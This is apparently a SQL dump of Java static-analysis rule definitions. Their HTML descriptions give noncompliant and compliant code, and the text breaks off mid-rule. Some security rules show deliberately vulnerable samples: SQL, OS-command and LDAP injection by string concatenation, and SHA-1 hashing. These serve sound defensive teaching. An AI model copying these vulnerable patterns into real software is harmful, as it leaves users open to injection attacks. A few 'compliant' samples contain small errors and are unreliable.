INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (740, 'The names of methods with boolean return values should start with "is" or "has"', 'S2047', NULL, 'squid', '<p>Well-named functions can allow the users of your code to understand at a glance what to expect from the function - even before reading the
documentation. Toward that end, methods returning a boolean should have names that start with "is" or "has" rather than with "get".</p>
<h2>Noncompliant Code Example</h2>
<pre>
public boolean getFoo() { // Noncompliant
  // ...
}

public boolean getBar(Bar c) { // Noncompliant
  // ...
}

public boolean testForBar(Bar c) { // Compliant - The method does not start by ''get''.
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public boolean isFoo() {
  // ...
}

public boolean hasBar(Bar c) {
  // ...
}

public boolean testForBar(Bar c) {
  // ...
}
</pre>
<h2>Exceptions</h2>
<p>Overriding methods are excluded.</p>
<pre>
@Override
public boolean getFoo(){
  // ...
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, 'convention', false, 'HTML', 1510817812739, 1510817812739, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (742, 'SHA-1 and Message-Digest hash algorithms should not be used', 'S2070', NULL, 'squid', '<p>The MD5 algorithm and its successor, SHA-1, are no longer considered secure, because it is too easy to create hash collisions with them. That is,
it takes too little computational effort to come up with a different input that produces the same MD5 or SHA-1 hash, and using the new, same-hash
value gives an attacker the same access as if he had the originally-hashed value. This applies as well to the other Message-Digest algorithms: MD2,
MD4, MD6, RIPEMD160.</p>
<p>The following APIs are tracked for use of obsolete crypto algorithms:</p>
<p> * <code>java.security.AlgorithmParameters</code> (JDK)</p>
<p> * <code>java.security.AlgorithmParameterGenerator</code> (JDK)</p>
<p> * <code>java.security.MessageDigest</code> (JDK)</p>
<p> * <code>java.security.KeyFactory</code> (JDK)</p>
<p> * <code>java.security.KeyPairGenerator</code> (JDK)</p>
<p> * <code>java.security.Signature</code> (JDK)</p>
<p> * <code>javax.crypto.Mac</code> (JDK)</p>
<p> * <code>javax.crypto.KeyGenerator</code> (JDK)</p>
<p> * <code>org.apache.commons.codec.digest.DigestUtils</code> (Apache Commons Codec)</p>
<p> * <code>com.google.common.hash.Hashing</code> (Guava)</p>
<h2>Noncompliant Code Example</h2>
<pre>
MessageDigest md = MessageDigest.getInstance("SHA1");  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
MessageDigest md = MessageDigest.getInstance("SHA-256");
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/328">MITRE, CWE-328</a> - Reversible One-Way Hash </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/327">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>
  <li> <a href="https://www.owasp.org/index.php/Top_10_2013-A6-Sensitive_Data_Exposure">OWASP Top Ten 2013 Category A6</a> - Sensitive Data Exposure
  </li>
  <li> <a href="http://www.sans.org/top25-software-errors/">SANS Top 25</a> - Porous Defenses </li>
  <li> Derived from FindSecBugs rule <a href="http://h3xstream.github.io/find-sec-bugs/bugs.htm#WEAK_MESSAGE_DIGEST">MessageDigest Is Weak</a> </li>
</ul>', 3, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '30min', NULL, NULL, 'cwe,owasp-a6,sans-top25-porous', false, 'HTML', 1510817812741, 1510817812742, 3);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (743, 'EJB interceptor exclusions should be declared as annotations', 'S3282', NULL, 'squid', '<p>Exclusions for default interceptors can be declared either in xml or as class annotations. Since annotations are more visible to maintainers, they
are preferred.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;assembly-descriptor&gt;
      &lt;interceptor-binding&gt;
         &lt;ejb-name&gt;MyExcludedClass&lt;/ejb-name&gt;
         &lt;exclude-default-interceptors&gt;true&lt;/exclude-default-interceptors&gt; &lt;!-- Noncompliant --&gt;
         &lt;exclude-class-interceptors&gt;true&lt;/exclude-class-interceptors&gt; &lt;!-- Noncomopliant --&gt;
         &lt;method&gt;
           &lt;method-name&gt;doTheThing&lt;/method-name&gt;
         &lt;/method&gt;
      &lt;/interceptor-binding&gt;

&lt;/assembly-descriptor&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
@ExcludeDefaultInterceptors
public class MyExcludedClass implements MessageListener
{

  @ExcludeClassInterceptors
  @ExcludeDefaultInterceptors
  public void doTheThing() {
    // ...
  }
</pre>', 4, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, 'pitfall', false, 'HTML', 1510817812742, 1510817812743, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (744, 'Track uses of disallowed constructors', 'S4011', NULL, 'squid', '<p>This rule allows banning usage of certain constructors.</p>
<h2>Noncompliant Code Example</h2>
<p>Given parameters:</p>
<ul>
  <li> className: java.util.Date </li>
  <li> argumentTypes: java.lang.String </li>
</ul>
<pre>
Date birthday;
birthday = new Date("Sat Sep 27 05:42:21 EDT 1986");  // Noncompliant
birthday = new Date(528176541000L); // Compliant
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, true, 'HTML', 1510817812744, 1510817812744, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (745, 'Switches should be used for sequences of simple "String" tests', 'S2196', NULL, 'squid', '<p>Since Java 7, <code>String</code>s can be used as <code>switch</code> arguments. So when a single <code>String</code> is tested against three or
more values in an <code>if</code>/<code>else if</code> structure, it should be converted to a switch instead for greater readability.</p>
<p><strong>Note</strong> that this rule is automatically disabled when the project''s <code>sonar.java.source</code> is lower than <code>7</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if ("red".equals(choice)) {  // Noncompliant
  dispenseRed();
} else if ("blue".equals(choice)) {
  dispenseBlue();
} else if ("yellow".equals(choice)) {
  dispenseYellow();
} else {
  promptUser();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
switch(choice) {
  case "Red":
    dispenseRed();
    break;
  case "Blue":
    dispenseBlue():
    break;
  case "Yellow":
    dispenseYellow();
    break;
  default:
    promptUser();
    break;
}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'clumsy', false, 'HTML', 1510817812746, 1510817812747, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (746, '"writeObject" should not be the only "synchronized" code in a class', 'S3042', NULL, 'squid', '<p>The purpose of synchronization is to ensure that only one thread executes a given block of code at a time. There''s no real problem with marking
<code>writeObject</code> <code>synchronized</code>, but if it''s highly suspicious if this serialization-related method the only
<code>synchronized</code> code in a <code>class</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class RubberBall {

  private Color color;
  private int diameter;

  public RubberBall(Color color, int diameter) {
    // ...
  }

  public void bounce(float angle, float velocity) {
    // ...
  }

  private synchronized void writeObject(ObjectOutputStream stream) throws IOException { // Noncompliant
    // ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class RubberBall {

  private Color color;
  private int diameter;

   public RubberBall(Color color, int diameter) {
    // ...
  }

  public void bounce(float angle, float velocity) {
    // ...
  }

  private void writeObject(ObjectOutputStream stream) throws IOException {
    // ...
  }
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, 'confusing', false, 'HTML', 1510817812747, 1510817812748, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (747, 'Empty statements should be removed', 'EmptyStatementUsageCheck', 'S1116', 'squid', '<p>Empty statements, i.e. <code>;</code>, are usually introduced by mistake, for example because:</p>
<ul>
  <li> It was meant to be replaced by an actual statement, but this was forgotten. </li>
  <li> There was a typo which lead the semicolon to be doubled, i.e. <code>;;</code>. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
void doSomething() {
  ;                                                       // Noncompliant - was used as a kind of TODO marker
}

void doSomethingElse() {
  System.out.println("Hello, world!");;                     // Noncompliant - double ;
  ...
  for (int i = 0; i &lt; 3; System.out.println(i), i++);       // Noncompliant - Rarely, they are used on purpose as the body of a loop. It is a bad practice to have side-effects outside of the loop body
  ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
void doSomething() {}

void doSomethingElse() {
  System.out.println("Hello, world!");
  ...
  for (int i = 0; i &lt; 3; i++){
    System.out.println(i);
  }
  ...
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 14.3 - Before preprocessing, a null statement shall only occur on a line by itself; it may be followed by a comment provided that
  the first character following the null statement is a white-space character. </li>
  <li> MISRA C++:2008, 6-2-3 - Before preprocessing, a null statement shall only occur on a line by itself; it may be followed by a comment, provided
  that the first character following the null statement is a white-space character. </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/SIIyAQ">CERT, MSC12-CPP.</a> - Detect and remove code that has no effect </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/7gCTAw">CERT, MSC51-J.</a> - Do not place a semicolon immediately following an if, for,
  or while condition </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/i4FtAg">CERT, EXP15-C.</a> - Do not place a semicolon on the same line as an if, for,
  or while statement </li>
</ul>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'cert,misra,unused', false, 'HTML', 1510817812748, 1510817812749, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (748, 'SQL binding mechanisms should be used', 'S2077', NULL, 'squid', '<p>Applications that execute SQL commands should neutralize any externally-provided values used in those commands. Failure to do so could allow an
attacker to include input that changes the query so that unintended commands are executed, or sensitive data is exposed.</p>
<p>This rule checks a variety of methods from different frameworks which are susceptible to SQL injection if not used properly. Frameworks which are
covered are Java JDBC, JPA, JDO, Hibernate and Spring. The following specific method signatures are tested. </p>
<ul>
  <li> <code>org.hibernate.Session.createQuery</code> </li>
  <li> <code>org.hibernate.Session.createSQLQuery</code> </li>
  <li> <code>java.sql.Statement.executeQuery</code> </li>
  <li> <code>java.sql.Statement.execute</code> </li>
  <li> <code>java.sql.Statement.executeUpdate</code> </li>
  <li> <code>java.sql.Statement.executeLargeUpdate</code> </li>
  <li> <code>java.sql.Statement.addBatch</code> </li>
  <li> <code>java.sql.Connection.prepareStatement</code> </li>
  <li> <code>java.sql.Connection.prepareCall</code> </li>
  <li> <code>java.sql.Connection.nativeSQL</code> </li>
  <li> <code>javax.persistence.EntityManager.createNativeQuery</code> </li>
  <li> <code>javax.persistence.EntityManager.createQuery</code> </li>
  <li> <code>org.springframework.jdbc.core.JdbcOperations.batchUpdate</code> </li>
  <li> <code>org.springframework.jdbc.core.JdbcOperations.execute</code> </li>
  <li> <code>org.springframework.jdbc.core.JdbcOperations.query</code> </li>
  <li> <code>org.springframework.jdbc.core.JdbcOperations.queryForList</code> </li>
  <li> <code>org.springframework.jdbc.core.JdbcOperations.queryForMap</code> </li>
  <li> <code>org.springframework.jdbc.core.JdbcOperations.queryForObject</code> </li>
  <li> <code>org.springframework.jdbc.core.JdbcOperations.queryForRowSet</code> </li>
  <li> <code>org.springframework.jdbc.core.JdbcOperations.queryForInt</code> </li>
  <li> <code>org.springframework.jdbc.core.JdbcOperations.queryForLong</code> </li>
  <li> <code>org.springframework.jdbc.core.JdbcOperations.update</code> </li>
  <li> <code>org.springframework.jdbc.core.PreparedStatementCreatorFactory.&lt;init&gt;</code> </li>
  <li> <code>org.springframework.jdbc.core.PreparedStatementCreatorFactory.newPreparedStatementCreator</code> </li>
  <li> <code>javax.jdo.PersistenceManager.newQuery</code> </li>
  <li> <code>javax.jdo.Query.setFilter</code> </li>
  <li> <code>javax.jdo.Query.setGrouping</code> </li>
</ul>
<p>If a method is defined in an interface, implementations are also tested. For example this is the case for
<code>org.springframework.jdbc.core.JdbcOperations</code> , which is usually used as <code>org.springframework.jdbc.core.JdbcTemplate</code>). </p>
<h2>Noncompliant Code Example</h2>
<pre>
public User getUser(Connection con, String user) throws SQLException {

  Statement stmt1 = null;
  Statement stmt2 = null;
  PreparedStatement pstmt;
  try {
    stmt1 = con.createStatement();
    ResultSet rs1 = stmt1.executeQuery("GETDATE()"); // Compliant; parameters not used here

    stmt2 = con.createStatement();
    ResultSet rs2 = stmt2.executeQuery("select FNAME, LNAME, SSN " +
                 "from USERS where UNAME=" + user);  // Noncompliant; parameter concatenated directly into query

    pstmt = con.prepareStatement("select FNAME, LNAME, SSN " +
                 "from USERS where UNAME=" + user);  // Noncompliant; parameter concatenated directly into query
    ResultSet rs3 = pstmt.executeQuery();

    //...
}

public User getUserHibernate(org.hibernate.Session session, String userInput) {

  org.hibernate.Query query = session.createQuery(  // Compliant
            "FROM students where fname = " + userInput);  // Noncompliant; parameter binding should be used instead
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public User getUser(Connection con, String user) throws SQLException {

  Statement stmt1 = null;
  PreparedStatement pstmt = null;
  String query = "select FNAME, LNAME, SSN " +
                 "from USERS where UNAME=?"
  try {
    stmt1 = con.createStatement();
    ResultSet rs1 = stmt1.executeQuery("GETDATE()");

    pstmt = con.prepareStatement(query);
    pstmt.setString(1, user);  // Compliant; PreparedStatements escape their inputs.
    ResultSet rs2 = pstmt.executeQuery();

    //...
  }
}

public User getUserHibernate(org.hibernate.Session session, String userInput) {

  org.hibernate.Query query =  session.createQuery("FROM students where fname = ?");
  query = query.setParameter(0,userInput);  // Parameter binding escapes all input
  // ...
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/89">MITRE, CWE-89</a> - Improper Neutralization of Special Elements used in an SQL Command </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/564.html">MITRE, CWE-564</a> - SQL Injection: Hibernate </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/20.html">MITRE, CWE-20</a> - Improper Input Validation </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/943.html">MITRE, CWE-943</a> - Improper Neutralization of Special Elements in Data Query Logic
  </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/PgIRAg">CERT, IDS00-J.</a> - Prevent SQL injection </li>
  <li> <a href="https://www.owasp.org/index.php/Top_10_2013-A1-Injection">OWASP Top Ten 2013 Category A1</a> - Injection </li>
  <li> <a href="http://www.sans.org/top25-software-errors/">SANS Top 25</a> - Insecure Interaction Between Components </li>
  <li> Derived from FindSecBugs rules <a href="http://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JPA">Potential SQL/JPQL Injection
  (JPA)</a>, <a href="http://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JDO">Potential SQL/JDOQL Injection (JDO)</a>, <a
  href="http://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_HIBERNATE">Potential SQL/HQL Injection (Hibernate)</a> </li>
</ul>', 4, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, 'cert,cwe,hibernate,owasp-a1,sans-top25-insecure,sql', false, 'HTML', 1510817812750, 1510817812750, 3);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (749, 'Values passed to OS commands should be sanitized', 'S2076', NULL, 'squid', '<p>Applications that execute operating system commands or execute commands that interact with the underlying system should neutralize any
externally-provided values used in those commands. Failure to do so could allow an attacker to include input that executes unintended commands, or
exposes sensitive data.</p>
<p>This rule logs issues for dynamically-built commands, and when parameter values are used to influence how a command is run. it''s then up to the
auditor to figure out if the command execution is secure or not. </p>
<h2>Noncompliant Code Example</h2>
<pre>
public void listContent(String input) {
  Runtime rt = Runtime.getRuntime();
  rt.exec("ls " + input); // Noncompliant; input could easily contain extra commands
  ...
}

public void execute(String command, String argument) {
  ProcessBuilder pb = new ProcessBuilder(command, argument); // Noncompliant
  ...
}

public void doTheThing(String path) {
  ProcessBuilder pb = new ProcessBuilder("ls");  // command hard coded. So far, so good
  pb.redirectOutput(path);  // Noncompliant
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/78">MITRE, CWE-78</a> - Improper Neutralization of Special Elements used in an OS Command </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/88">MITRE, CWE-88</a> - Argument Injection or Modification </li>
  <li> <a href="https://www.owasp.org/index.php/Top_10_2013-A1-Injection">OWASP Top Ten 2013 Category A1</a> - Injection </li>
  <li> <a href="http://www.sans.org/top25-software-errors/">SANS Top 25</a> - Insecure Interaction Between Components </li>
  <li> Derived from the FindSecBugs rule <a href="http://h3xstream.github.io/find-sec-bugs/bugs.htm#COMMAND_INJECTION">Potential Command Injection</a>
  </li>
</ul>', 3, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '30min', NULL, NULL, 'cwe,owasp-a1,sans-top25-insecure', false, 'HTML', 1510817812752, 1510817812752, 3);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (750, 'Modulus results should not be checked for direct equality', 'S2197', NULL, 'squid', '<p>When the modulus of a negative number is calculated, the result will either be negative or zero. Thus, comparing the modulus of a variable for
equality with a positive number (or a negative one) could result in unexpected results. </p>
<h2>Noncompliant Code Example</h2>
<pre>
public boolean isOdd(int x) {
  return x % 2 == 1;  // Noncompliant; if x is an odd negative, x % 2 == -1
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public boolean isOdd(int x) {
  return x % 2 != 0;
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/xAHAAQ">CERT, NUM51-J.</a> - Do not assume that the remainder operator always returns a
  nonnegative result for integral operands </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NQBi">CERT, INT10-C</a> - Do not assume a positive remainder when using the % operator
  </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/_YBLAQ">CERT, INT10-CPP.</a> - Do not assume a positive remainder when using the %
  operator </li>
</ul>', 3, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'cert,suspicious', false, 'HTML', 1510817812753, 1510817812753, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (751, 'Multiple loops over the same set should be combined', 'S3047', NULL, 'squid', '<p>When a method loops multiple over the same set of data, whether it''s a list or a set of numbers, it is highly likely that the method could be made
more efficient by combining the loops into a single set of iterations.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void doSomethingToAList(List&lt;String&gt; strings) {
  for (String str : strings) {
    doStep1(str);
  }
  for (String str : strings) {  // Noncompliant
    doStep2(str);
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void doSomethingToAList(List&lt;String&gt; strings) {
  for (String str : strings) {
    doStep1(str);
    doStep2(str);
  }
}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, 'performance', false, 'HTML', 1510817812754, 1510817812754, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (752, 'Values passed to LDAP queries should be sanitized', 'S2078', NULL, 'squid', '<p>Applications that execute LDAP queries should neutralize any externally-provided values in those commands. Failure to do so could allow an attacker
to include input that changes the query so that unintended commands are executed, or sensitive data is exposed. Unhappily LDAP doesn''t provide any
prepared statement interfaces like SQL to easily remove this risk. So each time a LDAP query is built dynamically this rule logs an issue.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public User lookupUser(String username, String base, String [] requestedAttrs) {

  // ...
  DirContext dctx = new InitialDirContext(env);

  SearchControls sc = new SearchControls();
  sc.setReturningAttributes(requestedAttrs);  // Noncompliant
  sc.setSearchScope(SearchControls.SUBTREE_SCOPE);

  String filter = "(&amp;(objectClass=user)(sAMAccountName=" + username + "))";

  NamingEnumeration results = dctx.search(base,  // Noncompliant
        filter,  // Noncompliant; parameter concatenated directly into string
        sc);
</pre>
<h2>Compliant Solution</h2>
<pre>
public User lookupUser(String username, String base, String [] requestedAttrs) {

  // ...
  DirContext dctx = new InitialDirContext(env);

  SearchControls sc = new SearchControls();
  sc.setReturningAttributes(buildAttrFilter(requestedAttrs));  // Compliant; method presumably scrubs input
  sc.setSearchScope(SearchControls.SUBTREE_SCOPE);

  String useBase = "ou=People";
  if (! base.startsWith(useBase)) {
    useBase = base;
  }

  String filter = "(&amp;(objectClass=user)(sAMAccountName=" + username.replaceAll("[()| ]","") + "))";

  NamingEnumeration results = dctx.search(useBase,  // Compliant; originally value used conditionally
        filter,  // Compliant; parameter NOT concatenated directly into string
        sc);
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/90">MITRE CWE-90</a> - Improper Neutralization of Special Elements used in an LDAP Query (''LDAP
  Injection'') </li>
  <li> <a href="https://www.owasp.org/index.php/Top_10_2013-A1-Injection">OWASP Top Ten 2013 Category A1</a> - Injection </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/CgLEAw">CERT, IDS54-J.</a> - Prevent LDAP injection </li>
  <li> Derived from FindSecBugs rule <a href="http://h3xstream.github.io/find-sec-bugs/bugs.htm#LDAP_INJECTION">Potential LDAP Injection</a> </li>
</ul>', 3, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '30min', NULL, NULL, 'cert,cwe,owasp-a1', false, 'HTML', 1510817812755, 1510817812756, 3);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (753, '"wait" should not be called when multiple locks are held', 'S3046', NULL, 'squid', '<p>When two locks are held simultaneously, a <code>wait</code> call only releases one of them. The other will be held until some other thread requests
a lock on the awaited object. If no unrelated code tries to lock on that object, then all other threads will be locked out, resulting in a
deadlock.</p>
<h2>Noncompliant Code Example</h2>
<pre>
synchronized (this.mon1) {  // threadB can''t enter this block to request this.mon2 lock &amp; release threadA
	synchronized (this.mon2) {
		this.mon2.wait();  // Noncompliant; threadA is stuck here holding lock on this.mon1
	}
}
</pre>', 4, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '30min', NULL, NULL, 'deadlock,multi-threading', false, 'HTML', 1510817812756, 1510817812757, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (754, 'Magic numbers should not be used', 'S109', NULL, 'squid', '<p>A magic number is a number that comes out of nowhere, and is directly used in a statement. Magic numbers are often used, for instance to limit the
number of iterations of a loops, to test the value of a property, etc.</p>
<p>Using magic numbers may seem obvious and straightforward when you''re writing a piece of code, but they are much less obvious and straightforward at
debugging time.</p>
<p>That is why magic numbers must be demystified by first being assigned to clearly named variables before being used.</p>
<p>-1, 0 and 1 are not considered magic numbers.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public static void doSomething() {
	for(int i = 0; i &lt; 4; i++){                 // Noncompliant, 4 is a magic number
		...
	}
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public static final int NUMBER_OF_CYCLES = 4;
public static void doSomething() {
  for(int i = 0; i &lt; NUMBER_OF_CYCLES ; i++){
    ...
  }
}
</pre>
<h2>Exceptions</h2>
<p>This rule ignores <code>hashCode</code> methods.</p>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'brain-overload', false, 'HTML', 1510817812757, 1510817812758, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (755, 'Standard outputs should not be used directly to log anything', 'S106', NULL, 'squid', '<p>When logging a message there are several important requirements which must be fulfilled:</p>
<ul>
  <li> The user must be able to easily retrieve the logs </li>
  <li> The format of all logged message must be uniform to allow the user to easily read the log </li>
  <li> Logged data must actually be recorded </li>
  <li> Sensitive data must only be logged securely </li>
</ul>
<p>If a program directly writes to the standard outputs, there is absolutely no way to comply with those requirements. That''s why defining and using a
dedicated logger is highly recommended.</p>
<h2>Noncompliant Code Example</h2>
<pre>
System.out.println("My Message");  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
logger.log("My Message");
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/RoElAQ">CERT, ERR02-J.</a> - Prevent exceptions while logging data </li>
</ul>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'bad-practice,cert', false, 'HTML', 1510817812759, 1510817812760, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (758, '"readResolve" methods should be inheritable', 'S2062', NULL, 'squid', '<p>The <code>readResolve()</code> method allows final tweaks to the state of an object during deserialization. Non-final classes which implement
<code>readResolve()</code>, should not set its visibility to <code>private</code> since it will then be unavailable to child classes.</p>
<h2>Noncompliant Code Example</h2>
<pre>
